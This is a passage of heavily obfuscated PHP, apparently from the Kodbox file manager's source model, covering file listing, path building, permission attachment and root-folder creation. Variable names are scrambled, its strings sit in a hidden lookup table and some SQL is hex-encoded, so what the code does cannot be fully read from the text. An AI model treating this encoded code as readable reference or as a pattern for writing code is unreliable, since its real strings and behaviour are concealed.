=> 0, $áÙÏò‘ö[553] => 0); if (isset($Àƒ¢ŠÊæ[$´‡­ºŞ[$áÙÏò‘ö[193]]])) { $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[554]] = 1; $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[555]] = $Àƒ¢ŠÊæ[$´‡­ºŞ[$áÙÏò‘ö[193]]][$áÙÏò‘ö[32]]; } if ($Âó¯“Ä£ && $º¤¤ó½ï && isset($Âó¯“Ä£[$´‡­ºŞ[$áÙÏò‘ö[193]]])) { $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[556]] = array(); foreach ($Âó¯“Ä£[$´‡­ºŞ[$áÙÏò‘ö[193]]] as $Á’±óÑÀ) { $ß¦î·ş = $º¤¤ó½ï[$Á’±óÑÀ]; $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[556]][] = array($áÙÏò‘ö[557] => $ß¦î·ş[$áÙÏò‘ö[475]], $áÙÏò‘ö[494] => $ß¦î·ş[$áÙÏò‘ö[32]], $áÙÏò‘ö[558] => $ß¦î·ş[$áÙÏò‘ö[559]]); } } if ($èÌªå·‘ && isset($èÌªå·‘[$´‡­ºŞ[$áÙÏò‘ö[193]]])) { $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[560]] = array(); foreach ($èÌªå·‘[$´‡­ºŞ[$áÙÏò‘ö[193]]] as $Ñ‚İÓ­¥) { $×àâ½ÁÀ = $áÙÏò‘ö[561]; if ($Ñ‚İÓ­¥[$áÙÏò‘ö[562]] == $áÙÏò‘ö[91]) { $×àâ½ÁÀ .= $áÙÏò‘ö[563]; } $´‡­ºŞ[$áÙÏò‘ö[90]][$áÙÏò‘ö[560]] = array_field_key($Ñ‚İÓ­¥, explode($áÙÏò‘ö[50], $×àâ½ÁÀ)); } } } unset($´‡­ºŞ); return $¿ ©ß÷Ÿ; } protected function _listAppendChildren(&$ÛÒèïç, $Ê±ş¿•µ) { $™¶Ûº±Ù =& $_SERVER[íïàËŸë]; $Øı¹Âˆ = array(); $‘ñÛ…û‹ = array($™¶Ûº±Ù[239] => 0, $™¶Ûº±Ù[240] => 0); foreach ($ÛÒèïç as &$ìÕßóÒÏ) { if (!$ìÕßóÒÏ[$™¶Ûº±Ù[485]]) { continue; } $Øı¹Âˆ[] = $ìÕßóÒÏ[$™¶Ûº±Ù[193]]; } unset($ìÕßóÒÏ); if (!$Øı¹Âˆ) { return; } $û“Ïáî = array($™¶Ûº±Ù[192] => array($™¶Ûº±Ù[7], $Øı¹Âˆ), $™¶Ûº±Ù[505] => 0); $Ú†–¤Ë¥ = array($™¶Ûº±Ù[192], $™¶Ûº±Ù[485], $™¶Ûº±Ù[564] => $™¶Ûº±Ù[565]); $¼ÄÜØå° = $this->field($Ú†–¤Ë¥)->where($û“Ïáî)->group($™¶Ûº±Ù[566])->select(); $Ò‘ê’Î„ = array(); foreach ($¼ÄÜØå° as $¶’îš…ñ) { $²‹å§Õı = $¶’îš…ñ[$™¶Ûº±Ù[192]]; $Ìış«õØ = $¶’îš…ñ[$™¶Ûº±Ù[485]] == $™¶Ûº±Ù[91] ? $™¶Ûº±Ù[240] : $™¶Ûº±Ù[239]; if (!isset($Ò‘ê’Î„[$²‹å§Õı])) { $Ò‘ê’Î„[$²‹å§Õı] = array($™¶Ûº±Ù[239] => 0, $™¶Ûº±Ù[240] => 0); } $Ò‘ê’Î„[$²‹å§Õı][$Ìış«õØ] += $¶’îš…ñ[$™¶Ûº±Ù[565]]; } foreach ($ÛÒèïç as &$ìÕßóÒÏ) { if (!$ìÕßóÒÏ[$™¶Ûº±Ù[485]]) { continue; } $”›âä•â = is_array($Ò‘ê’Î„[$ìÕßóÒÏ[$™¶Ûº±Ù[193]]]) ? $Ò‘ê’Î„[$ìÕßóÒÏ[$™¶Ûº±Ù[193]]] : $‘ñÛ…û‹; $ìÕßóÒÏ[$™¶Ûº±Ù[240]] = $”›âä•â[$™¶Ûº±Ù[240]]; $ìÕßóÒÏ[$™¶Ûº±Ù[239]] = $”›âä•â[$™¶Ûº±Ù[239]]; unset($ìÕßóÒÏ[$™¶Ûº±Ù[486]]); } unset($ìÕßóÒÏ); } protected function _listAppendAuth(&$•ıèª) { $¤ŠÍü­ =& $_SERVER[íïàËŸë]; $Öş¤ÑÏı = array(); foreach ($•ıèª as $§ÛÈ½ùÆ) { if ($§ÛÈ½ùÆ[$¤ŠÍü­[190]] == self::TYPE_GROUP) { $Öş¤ÑÏı[] = $§ÛÈ½ùÆ[$¤ŠÍü­[193]]; } } if (!$Öş¤ÑÏı) { return; } $«ŸÃ‘ï¨ = array_to_keyvalue($•ıèª, $¤ŠÍü­[193]); $ïïÎŸûÍ = Model($¤ŠÍü­[567])->getSourceList($Öş¤ÑÏı, $«ŸÃ‘ï¨); $Úä¿¼´­ = KodUser::isRoot(); foreach ($•ıèª as $À‹œ»™ª => &$§ÛÈ½ùÆ) { $§ÛÈ½ùÆ[$¤ŠÍü­[487]] = $ïïÎŸûÍ[$§ÛÈ½ùÆ[$¤ŠÍü­[193]]]; if (!$§ÛÈ½ùÆ[$¤ŠÍü­[487]] && $§ÛÈ½ùÆ[$¤ŠÍü­[190]] == self::TYPE_GROUP) { $§ÛÈ½ùÆ[$¤ŠÍü­[487]] = Action($¤ŠÍü­[568])->pathGroupAuthMake($§ÛÈ½ùÆ[$¤ŠÍü­[569]]); if (!$§ÛÈ½ùÆ[$¤ŠÍü­[487]] && !$Úä¿¼´­) { $§ÛÈ½ùÆ[$¤ŠÍü­[233]] = !1; $§ÛÈ½ùÆ[$¤ŠÍü­[232]] = !1; } } if ($§ÛÈ½ùÆ[$¤ŠÍü­[487]]) { $§ÛÈ½ùÆ[$¤ŠÍü­[233]] = AuthModel::authCheckEdit($§ÛÈ½ùÆ[$¤ŠÍü­[487]][$¤ŠÍü­[488]]); $§ÛÈ½ùÆ[$¤ŠÍü­[232]] = AuthModel::authCheckView($§ÛÈ½ùÆ[$¤ŠÍü­[487]][$¤ŠÍü­[488]]); } $this->groupPathDisplay($§ÛÈ½ùÆ); } unset($§ÛÈ½ùÆ); } public function _listAppendAuthSecret(&$‡Åú©ö) { $¿„¢„Ê¡ =& $_SERVER[íïàËŸë]; if (Model($¿„¢„Ê¡[508])->get($¿„¢„Ê¡[570]) != $¿„¢„Ê¡[91]) { return; } static $øÏáê– = false; if (!$øÏáê–) { $ÂäÎÄ˜ = Model($¿„¢„Ê¡[571]); $±¶¤­„ê = Model($¿„¢„Ê¡[572]); $øÏáê– = $±¶¤­„ê->listData(); $øÏáê– = array_to_keyvalue($øÏáê–, $¿„¢„Ê¡[193]); $à€òëŒ® = json_decode(Model($¿„¢„Ê¡[508])->get($¿„¢„Ê¡[573]), !0); $à€òëŒ® = array_to_keyvalue($à€òëŒ®, $¿„¢„Ê¡[475]); foreach ($øÏáê– as $¢äİ×–Ğ => $úìÀèÓ²) { $Õ²“¸¯ = $à€òëŒ®[$úìÀèÓ²[$¿„¢„Ê¡[574]]]; if (!$Õ²“¸¯) { $±¶¤­„ê->remove($úìÀèÓ²[$¿„¢„Ê¡[475]]); unset($øÏáê–[$¢äİ×–Ğ]); continue; } $ÃÅ­Ÿêœ = $ÂäÎÄ˜->listData($Õ²“¸¯[$¿„¢„Ê¡[487]]); if (!$ÃÅ­Ÿêœ) { $±¶¤­„ê->remove($úìÀèÓ²[$¿„¢„Ê¡[475]]); unset($øÏáê–[$¢äİ×–Ğ]); continue; } $úìÀèÓ²[$¿„¢„Ê¡[487]] = $ÃÅ­Ÿêœ; $úìÀèÓ²[$¿„¢„Ê¡[575]] = $Õ²“¸¯; $úìÀèÓ²[$¿„¢„Ê¡[576]] = Model($¿„¢„Ê¡[577])->getInfoSimpleOuter($úìÀèÓ²[$¿„¢„Ê¡[527]]); $øÏáê–[$¢äİ×–Ğ] = $úìÀèÓ²; } } $º‚†Úçö = USER_ID; $¶„¿…±× = array(); $¦‹ô™¶£ = $this->_listAppendPath($¶„¿…±×, !0); foreach ($‡Åú©ö as $¢äİ×–Ğ => &$úìÀèÓ²) { if (!is_array($úìÀèÓ²[$¿„¢„Ê¡[487]])) { continue; } if ($úìÀèÓ²[$¿„¢„Ê¡[190]] != $¿„¢„Ê¡[578]) { continue; } if (isset($øÏáê–[$úìÀèÓ²[$¿„¢„Ê¡[193]]])) { $ÔËè­ÜÑ = $øÏáê–[$úìÀèÓ²[$¿„¢„Ê¡[193]]]; if (!is_array($úìÀèÓ²[$¿„¢„Ê¡[539]])) { $úìÀèÓ²[$¿„¢„Ê¡[539]] = array(); } $úìÀèÓ²[$¿„¢„Ê¡[539]][$¿„¢„Ê¡[579]] = $ÔËè­ÜÑ[$¿„¢„Ê¡[574]]; $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[580]] = $ÔËè­ÜÑ; $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[581]] = $úìÀèÓ²[$¿„¢„Ê¡[582]]; $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[583]] = $¿„¢„Ê¡[91]; if ($ÔËè­ÜÑ[$¿„¢„Ê¡[527]] != $º‚†Úçö) { $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[488]] = $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[488]] & $ÔËè­ÜÑ[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[487]]; } continue; } $¼¨Í‰ÛØ = $this->parentLevelArray($úìÀèÓ²[$¿„¢„Ê¡[584]]); $ãŠÆÖöª = array_reverse($¼¨Í‰ÛØ); foreach ($ãŠÆÖöª as $¾æÇªÏä => $°øÑïçú) { if (!isset($øÏáê–[$°øÑïçú])) { continue; } $ÔËè­ÜÑ = $øÏáê–[$°øÑïçú]; $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[580]] = $ÔËè­ÜÑ; if ($ÔËè­ÜÑ[$¿„¢„Ê¡[527]] != $º‚†Úçö) { $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[488]] = $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[488]] & $ÔËè­ÜÑ[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[487]]; } $†‹«¹÷® = $¿„¢„Ê¡[12]; $¡ë—ËÂÚ = count($¼¨Í‰ÛØ) - $¾æÇªÏä; for ($Ô£Ú™Ú¾ = 0; $Ô£Ú™Ú¾ < $¡ë—ËÂÚ; $Ô£Ú™Ú¾++) { if (!isset($¦‹ô™¶£[$¼¨Í‰ÛØ[$Ô£Ú™Ú¾]])) { $†‹«¹÷® = $¿„¢„Ê¡[12]; break; } $†‹«¹÷® = $†‹«¹÷® . rtrim($¦‹ô™¶£[$¼¨Í‰ÛØ[$Ô£Ú™Ú¾]], $¿„¢„Ê¡[8]) . $¿„¢„Ê¡[8]; } $úìÀèÓ²[$¿„¢„Ê¡[487]][$¿„¢„Ê¡[581]] = rtrim($†‹«¹÷®, $¿„¢„Ê¡[8]) . $¿„¢„Ê¡[8]; break; } } unset($úìÀèÓ²); } public function groupPathDisplay(&$ä‹äšÚ×) { $‹â¾‡Å¸ =& $_SERVER[íïàËŸë]; if ($ä‹äšÚ×[$‹â¾‡Å¸[190]] != self::TYPE_GROUP) { return; } $Óş¯Ç£… = Model($‹â¾‡Å¸[585])->getInfo($ä‹äšÚ×[$‹â¾‡Å¸[569]]); $ÔÇ’€ŠÍ = $this->parentLevelArray($Óş¯Ç£…[$‹â¾‡Å¸[584]]); $¤¶Š²Èş = $‹â¾‡Å¸[12]; foreach ($ÔÇ’€ŠÍ as $ñÉÃÁÎ´) { $ãÃıÆ‡ = Model($‹â¾‡Å¸[585])->getInfo($ñÉÃÁÎ´); $¤¶Š²Èş .= $ãÃıÆ‡[$‹â¾‡Å¸[90]][$‹â¾‡Å¸[193]] . $‹â¾‡Å¸[50]; } $ä‹äšÚ×[$‹â¾‡Å¸[586]] = $Óş¯Ç£…[$‹â¾‡Å¸[192]]; $ä‹äšÚ×[$‹â¾‡Å¸[587]] = $Óş¯Ç£…[$‹â¾‡Å¸[584]]; $ä‹äšÚ×[$‹â¾‡Å¸[588]] = $Óş¯Ç£…[$‹â¾‡Å¸[589]]; $ä‹äšÚ×[$‹â¾‡Å¸[590]] = $¤¶Š²Èş . $Óş¯Ç£…[$‹â¾‡Å¸[90]][$‹â¾‡Å¸[193]]; } protected function _listAppendPath(&$Ô–¥«ë, $úòÕ÷™“ = false) { $ô±ÓüëÎ =& $_SERVER[íïàËŸë]; static $¿£İ‚Èü = array(); $†Ÿ¢ö„ = array(); $³îê‘³• = array(); if ($úòÕ÷™“) { return $¿£İ‚Èü; } foreach ($Ô–¥«ë as &$èæî©§í) { $³·»ÑÇ‚ = $èæî©§í[$ô±ÓüëÎ[193]]; if ($èæî©§í[$ô±ÓüëÎ[485]] == $ô±ÓüëÎ[91] && $èæî©§í[$ô±ÓüëÎ[192]] != 0) { $¿£İ‚Èü[$³·»ÑÇ‚] = $èæî©§í[$ô±ÓüëÎ[32]]; } if ($èæî©§í[$ô±ÓüëÎ[485]] == $ô±ÓüëÎ[91] && $èæî©§í[$ô±ÓüëÎ[192]] == 0) { $¿£İ‚Èü[$³·»ÑÇ‚] = $this->_listAppendPathRoot($èæî©§í, array()); } if (isset($³îê‘³•[$èæî©§í[$ô±ÓüëÎ[584]]])) { continue; } $³îê‘³•[$èæî©§í[$ô±ÓüëÎ[584]]] = !0; $ŞÅõ¯½’ = $this->parentLevelArray($èæî©§í[$ô±ÓüëÎ[584]]); foreach ($ŞÅõ¯½’ as $·‹È¨½ø => $‘àùØĞ³) { if (isset($¿£İ‚Èü[$‘àùØĞ³])) { continue; } if ($·‹È¨½ø == 0) { $¿£İ‚Èü[$‘àùØĞ³] = $this->_listAppendPathRoot($èæî©§í, $ŞÅõ¯½’); } if ($·‹È¨½ø != 0) { $†Ÿ¢ö„[] = $‘àùØĞ³; } } } unset($èæî©§í); $†Ÿ¢ö„ = array_unique($†Ÿ¢ö„); if (count($†Ÿ¢ö„) > 0) { $¢ò€Ø” = array($ô±ÓüëÎ[491] => array($ô±ÓüëÎ[492], $†Ÿ¢ö„)); if (count($†Ÿ¢ö„) == 1) { $»¬±µ‚ñ = $this->sourceInfo($†Ÿ¢ö„[0]); $È‘’Œ”´ = is_array($»¬±µ‚ñ) ? array($»¬±µ‚ñ) : !1; } else { $È‘’Œ”´ = $this->field($ô±ÓüëÎ[591])->where($¢ò€Ø”)->select(); } if (!$È‘’Œ”´) { $È‘’Œ”´ = array(); } foreach ($È‘’Œ”´ as $äÂøúï–) { $¿£İ‚Èü[$äÂøúï–[$ô±ÓüëÎ[193]]] = $äÂøúï–[$ô±ÓüëÎ[32]]; } } $ÌÏÊÓÖä = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $µÜÌ“Å² = array(); foreach ($Ô–¥«ë as &$èæî©§í) { $é†°Ïİ† = $èæî©§í[$ô±ÓüëÎ[584]]; $å‘§à¼Â = $ô±ÓüëÎ[12]; if (isset($µÜÌ“Å²[$é†°Ïİ†])) { $å‘§à¼Â = $µÜÌ“Å²[$é†°Ïİ†]; } else { $ŞÅõ¯½’ = $this->parentLevelArray($èæî©§í[$ô±ÓüëÎ[584]]); foreach ($ŞÅõ¯½’ as $·‹È¨½ø => $‘àùØĞ³) { if (isset($¿£İ‚Èü[$‘àùØĞ³])) { $å‘§à¼Â .= $¿£İ‚Èü[$‘àùØĞ³] . $ô±ÓüëÎ[8]; } } $µÜÌ“Å²[$é†°Ïİ†] = $å‘§à¼Â; } $å‘§à¼Â .= $èæî©§í[$ô±ÓüëÎ[32]]; if ($èæî©§í[$ô±ÓüëÎ[485]] == $ô±ÓüëÎ[91]) { $å‘§à¼Â .= $ô±ÓüëÎ[8]; } $èæî©§í[$ô±ÓüëÎ[582]] = str_replace($ô±ÓüëÎ[592], $ô±ÓüëÎ[8], $å‘§à¼Â); if ($èæî©§í[$ô±ÓüëÎ[192]] == $ô±ÓüëÎ[228]) { $èæî©§í[$ô±ÓüëÎ[32]] = trim($¿£İ‚Èü[$èæî©§í[$ô±ÓüëÎ[193]]], $ô±ÓüëÎ[8]); $èæî©§í[$ô±ÓüëÎ[582]] = $èæî©§í[$ô±ÓüëÎ[32]] . $ô±ÓüëÎ[8]; } if (intval($èæî©§í[$ô±ÓüëÎ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($èæî©§í, $ŞÅõ¯½’, $ÌÏÊÓÖä); } } unset($èæî©§í); return $Ô–¥«ë; } private function _listAppendPathRecycle(&$İÆ¶š¿‚, $˜”‰ÌÕ¦, $ô…ÆéºÉ) { $öƒ¬¡Ê· =& $_SERVER[íïàËŸë]; if (!in_array($ô…ÆéºÉ, $˜”‰ÌÕ¦) && $İÆ¶š¿‚[$öƒ¬¡Ê·[193]] != $ô…ÆéºÉ) { return; } $ŠƒÁë = explode($öƒ¬¡Ê·[8], trim($İÆ¶š¿‚[$öƒ¬¡Ê·[582]], $öƒ¬¡Ê·[8])); $ïŠ¾ñ“Ô = implode($öƒ¬¡Ê·[8], array_slice($ŠƒÁë, 2)); $İÆ¶š¿‚[$öƒ¬¡Ê·[582]] = $öƒ¬¡Ê·[8] . LNG($öƒ¬¡Ê·[593]) . $öƒ¬¡Ê·[8] . ltrim($ïŠ¾ñ“Ô, $öƒ¬¡Ê·[8]); $İÆ¶š¿‚[$öƒ¬¡Ê·[584]] = $öƒ¬¡Ê·[594] . implode($öƒ¬¡Ê·[50], array_slice($˜”‰ÌÕ¦, 1)) . $öƒ¬¡Ê·[50]; if ($İÆ¶š¿‚[$öƒ¬¡Ê·[193]] == $ô…ÆéºÉ) { $İÆ¶š¿‚[$öƒ¬¡Ê·[584]] = $öƒ¬¡Ê·[594]; $İÆ¶š¿‚[$öƒ¬¡Ê·[192]] = $öƒ¬¡Ê·[228]; $İÆ¶š¿‚[$öƒ¬¡Ê·[32]] = LNG($öƒ¬¡Ê·[593]); } $İÆ¶š¿‚[$öƒ¬¡Ê·[595]] = $öƒ¬¡Ê·[596]; } protected function _listAppendPathRoot(&$©±„—ä‰, $±–ÄøÛì) { $ÈÀŠˆ =& $_SERVER[íïàËŸë]; static $İ¤·Íª” = false; $«×öÂ” = $ÈÀŠˆ[12]; if ($©±„—ä‰[$ÈÀŠˆ[190]] == self::TYPE_USER) { if ($©±„—ä‰[$ÈÀŠˆ[569]] == USER_ID) { $«×öÂ” = LNG($ÈÀŠˆ[597]); if ($İ¤·Íª” === !1) { $‹ŞĞÈˆ = Model($ÈÀŠˆ[598])->getInfoFull(USER_ID); $İ¤·Íª” = _get($‹ŞĞÈˆ, $ÈÀŠˆ[599], $ÈÀŠˆ[12]); } if ($±–ÄøÛì && $±–ÄøÛì[0] == $İ¤·Íª” || !$±–ÄøÛì && $©±„—ä‰[$ÈÀŠˆ[193]] == $İ¤·Íª”) { $«×öÂ” = LNG($ÈÀŠˆ[600]); $©±„—ä‰[$ÈÀŠˆ[601]] = $ÈÀŠˆ[602]; } if (!$±–ÄøÛì) { $©±„—ä‰[$ÈÀŠˆ[32]] = $«×öÂ”; } } else { $©±„—ä‰[$ÈÀŠˆ[603]] = Model($ÈÀŠˆ[577])->getInfoSimpleOuter($©±„—ä‰[$ÈÀŠˆ[569]]); $«×öÂ” = LNG($ÈÀŠˆ[604]) . $ÈÀŠˆ[176] . $©±„—ä‰[$ÈÀŠˆ[603]][$ÈÀŠˆ[32]] . $ÈÀŠˆ[178]; } } else { if ($©±„—ä‰[$ÈÀŠˆ[190]] == self::TYPE_GROUP) { $ª­…¸ = Model($ÈÀŠˆ[585])->getInfoSimple($©±„—ä‰[$ÈÀŠˆ[569]]); $«×öÂ” = $ª­…¸[$ÈÀŠˆ[32]]; } else { if ($©±„—ä‰[$ÈÀŠˆ[190]] == self::TYPE_SYSTEM) { $«×öÂ” = $ÈÀŠˆ[605]; } } } $«×öÂ” = $«×öÂ” ? $ÈÀŠˆ[8] . $«×öÂ” . $ÈÀŠˆ[8] : $ÈÀŠˆ[8]; return $«×öÂ”; } protected function _listAppendUser(&$ÚÊÍ£°Œ) { $–½Êî÷§ =& $_SERVER[íïàËŸë]; $”ŞÖï”ß = array_to_keyvalue($ÚÊÍ£°Œ, $–½Êî÷§[12], $–½Êî÷§[527]); $Ñ—¹ªá´ = array_to_keyvalue($ÚÊÍ£°Œ, $–½Êî÷§[12], $–½Êî÷§[529]); $ôˆ‘Ö¼ = array_merge($”ŞÖï”ß, $Ñ—¹ªá´); $Ã€²ãÖ = Model($–½Êî÷§[598])->userListInfo($ôˆ‘Ö¼); foreach ($ÚÊÍ£°Œ as &$ñÅıÏ¯§) { $ãáÁìˆù = $ñÅıÏ¯§[$–½Êî÷§[527]]; $ñÅıÏ¯§[$–½Êî÷§[527]] = $Ã€²ãÖ[$ãáÁìˆù] ? $Ã€²ãÖ[$ãáÁìˆù] : !1; $ãáÁìˆù = $ñÅıÏ¯§[$–½Êî÷§[529]]; $ñÅıÏ¯§[$–½Êî÷§[529]] = $Ã€²ãÖ[$ãáÁìˆù] ? $Ã€²ãÖ[$ãáÁìˆù] : !1; if (_get($ñÅıÏ¯§, $–½Êî÷§[606], 0)) { $ê£Ä·­ = $GLOBALS[$–½Êî÷§[6]][$–½Êî÷§[92]][$–½Êî÷§[607]]; if ($ñÅıÏ¯§[$–½Êî÷§[539]][$–½Êî÷§[608]] <= time() - $ê£Ä·­) { $this->metaSet($ñÅıÏ¯§[$–½Êî÷§[193]], $–½Êî÷§[609], null); $this->metaSet($ñÅıÏ¯§[$–½Êî÷§[193]], $–½Êî÷§[608], null); unset($ñÅıÏ¯§[$–½Êî÷§[539]][$–½Êî÷§[609]]); continue; } $ö¶›•• = $ñÅıÏ¯§[$–½Êî÷§[539]][$–½Êî÷§[609]]; $ñÅıÏ¯§[$–½Êî÷§[539]][$–½Êî÷§[610]] = Model($–½Êî÷§[598])->getInfoSimpleOuter($ö¶›••); } } unset($ñÅıÏ¯§); } public function parentLevelArray($æ…œâ½é) { $¢ñ“ûö =& $_SERVER[íïàËŸë]; $æ…œâ½é = explode($¢ñ“ûö[50], trim($æ…œâ½é, $¢ñ“ûö[50])); return array_remove_value($æ…œâ½é, $¢ñ“ûö[228]); } public function listAll($Ÿíè‚³) { $ÛÌãş³£ =& $_SERVER[íïàËŸë]; $Ô²âÌ´‡ = $this->sourceInfo($Ÿíè‚³); $‡ ßºı‰ = array($ÛÌãş³£[611] => array($ÛÌãş³£[612], $Ô²âÌ´‡[$ÛÌãş³£[584]] . $Ÿíè‚³ . $ÛÌãş³£[613]), $ÛÌãş³£[614] => 0); $ŞÚéßÕ = $ÛÌãş³£[615]; $™ÙôËáÂ = "\x4c\105\106\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x69\157\x5f\146\151\154\145\40\x66\x69\154\x65\40\157\156\x20\x73\x6f\165\162\143\x65\56\146\x69\154\145\x49\104\x20\75\40\x66\x69\x6c\145\56\146\151\x6c\x65\x49\x44"; $¯¢‘ú‹½ = $this->alias($ÛÌãş³£[519])->field($ŞÚéßÕ)->where($‡ ßºı‰)->join($™ÙôËáÂ)->select(); $this->_listAppendAuth($¯¢‘ú‹½); $this->_listAppendUser($¯¢‘ú‹½); $this->_listAppendPath($¯¢‘ú‹½); $¯¢‘ú‹½ = array_to_keyvalue($¯¢‘ú‹½, $ÛÌãş³£[193]); $úŞßŞáâ = "\57{$Ô²âÌ´‡[$ÛÌãş³£[32]]}\x2f"; $úŞßŞáâ = $úŞßŞáâ == $ÛÌãş³£[592] ? $ÛÌãş³£[8] : $úŞßŞáâ; $ùıúÍñ = array(); foreach ($¯¢‘ú‹½ as $÷ÚÇ÷šª => $–ü©ù¡) { $œÊØÍ¬ê = $this->parentLevelArray($–ü©ù¡[$ÛÌãş³£[584]]); array_shift($œÊØÍ¬ê); $èìÚÃêÊ = $úŞßŞáâ; for ($òÙÕÒ³Ì = 0; $òÙÕÒ³Ì < count($œÊØÍ¬ê); $òÙÕÒ³Ì++) { $èìÚÃêÊ .= $¯¢‘ú‹½[$œÊØÍ¬ê[$òÙÕÒ³Ì]][$ÛÌãş³£[32]] . $ÛÌãş³£[8]; } $èìÚÃêÊ .= $–ü©ù¡[$ÛÌãş³£[32]]; if ($–ü©ù¡[$ÛÌãş³£[485]]) { $èìÚÃêÊ .= $ÛÌãş³£[8]; } $Óä¬‡õ™ = array($ÛÌãş³£[495] => str_replace($ÛÌãş³£[592], $ÛÌãş³£[8], str_replace($ÛÌãş³£[592], $ÛÌãş³£[8], str_replace($ÛÌãş³£[592], $ÛÌãş³£[8], $èìÚÃêÊ))), $ÛÌãş³£[616] => intval($–ü©ù¡[$ÛÌãş³£[485]]), $ÛÌãş³£[617] => intval($–ü©ù¡[$ÛÌãş³£[79]]), $ÛÌãş³£[88] => intval($–ü©ù¡[$ÛÌãş³£[88]]), $ÛÌãş³£[90] => $this->pathInfoFilter($–ü©ù¡)); if (!$Óä¬‡õ™[$ÛÌãş³£[485]]) { $Óä¬‡õ™[$ÛÌãş³£[541]] = $–ü©ù¡[$ÛÌãş³£[541]]; } $ùıúÍñ[] = $Óä¬‡õ™; } $ùıúÍñ = array_sort_by($ùıúÍñ, $ÛÌãş³£[87]); return $ùıúÍñ; } } goto CË†÷¥¹Ù¾; bÇ‰Ü¨…: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ô¯ßñâÄ) { $ô£¿ó¼ =& $_SERVER[íïàËŸë]; $ª¯¨¡ìË = Model($ô£¿ó¼[577])->where(array($ô£¿ó¼[1773] => $Ô¯ßñâÄ))->find(); $‡÷”ëŠÎ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ô¯ßñâÄ, $ª¯¨¡ìË[$ô£¿ó¼[32]]); $this->userDesktopAdd($‡÷”ëŠÎ); return $‡÷”ëŠÎ; } public function userDesktopAdd($ƒèÓ¦ƒØ) { $ÄäİÍ÷« =& $_SERVER[íïàËŸë]; $·ÈîòÈ‰ = LNG($ÄäİÍ÷«[2259]); $™É¸Á±ª = $this->mkdir($ƒèÓ¦ƒØ, $·ÈîòÈ‰); $this->metaSet($™É¸Á±ª, $ÄäİÍ÷«[2260], $ÄäİÍ÷«[91]); $this->metaSet($ƒèÓ¦ƒØ, $ÄäİÍ÷«[2261], $™É¸Á±ª); } public function userPathSafeAdd($±ä›ê’) { $†•ŠÚ =& $_SERVER[íïàËŸë]; $ò·ŒêË¨ = Model($†•ŠÚ[577])->getInfoFull($±ä›ê’); if (!$ò·ŒêË¨) { return !1; } if (_get($ò·ŒêË¨, $†•ŠÚ[599])) { return $ò·ŒêË¨[$†•ŠÚ[539]][$†•ŠÚ[2262]]; } $÷²‚ü = $this->_mkdirRoot(SourceModel::TYPE_USER, $±ä›ê’, $†•ŠÚ[2263], $†•ŠÚ[506]); Model($†•ŠÚ[577])->metaSet($±ä›ê’, $†•ŠÚ[2262], $÷²‚ü); $this->metaSet($÷²‚ü, $†•ŠÚ[2264], $±ä›ê’); return $÷²‚ü; } public function groupRootAdd($ıá®‡¢ ) { $Œ®ÓÛŸ² =& $_SERVER[íïàËŸë]; $ä»÷–æÕ = Model($Œ®ÓÛŸ²[585])->where(array($Œ®ÓÛŸ²[2072] => $ıá®‡¢ ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ıá®‡¢ , $ä»÷–æÕ[$Œ®ÓÛŸ²[32]]); } public function systemRootPathAdd($œ³ÛÛ¿›) { if ($œ³ÛÛ¿› != $_SERVER[íïàËŸë][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $œ³ÛÛ¿›); } public function userRootRemove($·Şá†¹Ó) { $Ü‹™äÖ = $this->targetSourceRoot(SourceModel::TYPE_USER, $·Şá†¹Ó, !0); foreach ($Ü‹™äÖ as $¿ÃÒÆÉ¤) { if (!$¿ÃÒÆÉ¤) { continue; } $this->remove($¿ÃÒÆÉ¤[$_SERVER[íïàËŸë][193]], !1); } } public function groupRootRemove($ÏÄ‡“„) { $´ˆ˜İ± = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÏÄ‡“„); if (!$´ˆ˜İ±) { return; } $this->remove($´ˆ˜İ±[$_SERVER[íïàËŸë][193]], !1); } private function _mkdirRoot($Üó©×•“, $’Ğ”ğèè, $¸“³¬ş£, $¼Ä¿€§— = '') { $¾îµŞÉæ =& $_SERVER[íïàËŸë]; $ö›àŠó‘ = defined($¾îµŞÉæ[2206]) ? USER_ID : 0; $ã¤”éï = array($¾îµŞÉæ[477] => 0, $¾îµŞÉæ[648] => $Üó©×•“, $¾îµŞÉæ[649] => $’Ğ”ğèè, $¾îµŞÉæ[646] => 1, $¾îµŞÉæ[650] => $ö›àŠó‘, $¾îµŞÉæ[651] => $ö›àŠó‘, $¾îµŞÉæ[647] => $¼Ä¿€§—, $¾îµŞÉæ[652] => $¾îµŞÉæ[594], $¾îµŞÉæ[504] => 0, $¾îµŞÉæ[617] => 0, $¾îµŞÉæ[542] => 0, $¾îµŞÉæ[653] => $¾îµŞÉæ[12]); if ($©ËÄÒäÚ = $this->where($ã¤”éï)->find()) { return $©ËÄÒäÚ[$¾îµŞÉæ[193]]; } $˜šò¶ÀÌ = "\x4d\157\144\x65\154\x53\x6f\165\x72\143\145\x2e\x6d\x6b\144\151\162\x52\x6f\157\164\56{$Üó©×•“}\x2e{$’Ğ”ğèè}\x2e" . $¸“³¬ş£; CacheLock::lock($˜šò¶ÀÌ); $ã¤”éï[$¾îµŞÉæ[32]] = $¸“³¬ş£; 